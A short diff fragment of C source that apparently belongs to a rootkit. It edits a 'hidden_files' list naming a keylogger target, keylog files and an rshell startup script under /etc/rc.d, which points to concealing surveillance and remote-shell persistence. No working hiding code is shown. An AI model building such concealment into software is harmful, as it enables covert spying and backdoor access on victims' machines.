@@ -43,7 +43,7 @@ static const char *hidden_files[NUM_HIDDEN_FILES] = {
 	"/usr/sbin/keylog_target",
 	"/etc/rc.d/rshell",
 	"/etc/rc.d/keylog",
-	"/tmp/keyLog_file"
+	"/tmp/keylog_file",
 };
 
 /* Transparent files.
